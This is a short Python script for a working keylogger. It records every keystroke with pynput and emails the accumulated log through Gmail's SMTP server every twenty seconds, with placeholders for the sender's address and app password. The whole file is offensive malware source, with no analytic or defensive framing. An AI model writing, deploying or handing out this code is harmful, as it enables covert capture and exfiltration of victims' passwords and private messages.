#!/usr/bin/env python3

import smtplib
import threading
import pynput.keyboard #TINY TWEENY KEYBOARD RECORDEENY

class Logger:
    
    def __init__(self, reportTime, email, passwd):
        self.reportTime = reportTime
        self.passwd = passwd
        self.email = email
        self._log = '[!] KEYLOGGER STARTED ON THE SYSTEM [!] \n'
        
        self.START()
        
    def START(self):
        keyboardListener = pynput.keyboard.Listener(on_press=self.KEY_PRESS)
        
        with keyboardListener:
            self.REPORT()
            keyboardListener.join()
            
    def KEY_PRESS(self, key):
        data = ''
        try:
            data += str(key.char)
        except AttributeError:
            if (key == key.space):
                data += " "
            elif (key == key.enter):
                data += " ENTER "
            elif (key == key.delete):
                data += " DELETE "
            else:
                data += " [" + str(key) + "] "

        self.ADD_TO_LOG(data)
    
    def SEND_TO_EMAIL(self, message):
        server = smtplib.SMTP("smtp.gmail.com", 587) #SMTP INSTANCE - Using google SMTP mail
        server.starttls() #TLS CONNECTION
        server.login(self.email, self.passwd) #LOGIN
        server.sendmail(self.email, self.email, "\n\n" + message) 
        server.quit()
        
    def ADD_TO_LOG(self, data):
        self._log += data
        
    def REPORT(self):
        
        print(self._log)
        self.SEND_TO_EMAIL(self._log)
        
        self._log = ''
        
        timer = threading.Timer(self.reportTime, self.REPORT)
        timer.start()
        

Logger(20, "<YOUR OWN MAIL>", "<YOUR OWN MAIL APP PASSWORD>")